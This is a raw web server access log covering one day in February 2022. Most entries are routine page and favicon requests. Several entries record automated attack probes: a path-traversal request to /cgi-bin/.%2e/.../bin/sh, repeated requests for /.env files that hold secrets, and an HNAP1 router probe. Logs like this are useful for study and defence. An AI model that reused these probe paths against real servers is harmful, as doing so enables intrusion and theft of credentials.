157.119.219.170 - - [14/Feb/2022:13:15:27 +0000] "GET / HTTP/1.1" 200 189 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
45.146.165.37 - - [14/Feb/2022:13:27:42 +0000] "GET / HTTP/1.1" 200 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.37 - - [14/Feb/2022:13:50:00 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 487 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.180.143.8 - - [14/Feb/2022:14:01:42 +0000] "GET / HTTP/1.1" 200 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.180.143.8 - - [14/Feb/2022:14:01:43 +0000] "GET /showLogin.cc HTTP/1.1" 404 388 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.254.196.223 - - [14/Feb/2022:14:30:41 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [14/Feb/2022:14:30:44 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.146.165.37 - - [14/Feb/2022:14:41:29 +0000] "GET / HTTP/1.1" 200 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
184.10.96.200 - - [14/Feb/2022:14:58:48 +0000] "GET / HTTP/1.1" 200 189 "-" "-"
180.215.130.19 - - [14/Feb/2022:17:06:04 +0000] "GET / HTTP/1.1" 200 189 "-" "-"
180.215.130.19 - - [14/Feb/2022:17:06:19 +0000] "GET /favicon.ico HTTP/1.1" 404 388 "-" "Go-http-client/1.1"
180.215.130.19 - - [14/Feb/2022:17:06:21 +0000] "GET /robots.txt HTTP/1.1" 404 388 "-" "Go-http-client/1.1"
180.215.130.19 - - [14/Feb/2022:17:06:28 +0000] "GET /sitemap.xml HTTP/1.1" 404 388 "-" "Go-http-client/1.1"
185.254.196.223 - - [14/Feb/2022:17:31:02 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [14/Feb/2022:17:31:02 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.89.35.208 - - [14/Feb/2022:18:40:08 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.89.35.208 - - [14/Feb/2022:18:40:08 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
201.150.173.149 - - [14/Feb/2022:19:17:04 +0000] "GET / HTTP/1.1" 200 189 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
169.255.65.250 - - [14/Feb/2022:19:42:08 +0000] "GET / HTTP/1.1" 200 245 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
23.225.180.198 - - [14/Feb/2022:20:12:28 +0000] "GET / HTTP/1.1" 200 189 "-" "-"
23.225.180.198 - - [14/Feb/2022:20:12:35 +0000] "GET /favicon.ico HTTP/1.1" 404 388 "-" "Go-http-client/1.1"
23.225.180.198 - - [14/Feb/2022:20:12:37 +0000] "GET /robots.txt HTTP/1.1" 404 388 "-" "Go-http-client/1.1"
23.225.180.198 - - [14/Feb/2022:20:12:39 +0000] "GET /sitemap.xml HTTP/1.1" 404 388 "-" "Go-http-client/1.1"
107.189.10.196 - - [14/Feb/2022:20:49:19 +0000] "GET / HTTP/1.1" 200 189 "-" "-"
107.189.10.196 - - [14/Feb/2022:20:49:19 +0000] "POST /HNAP1/ HTTP/1.1" 404 444 "-" "Mozila/5.0"
103.153.77.170 - - [14/Feb/2022:21:15:33 +0000] "GET / HTTP/1.1" 200 245 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
103.153.77.170 - - [14/Feb/2022:21:15:33 +0000] "GET / HTTP/1.1" 200 244 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
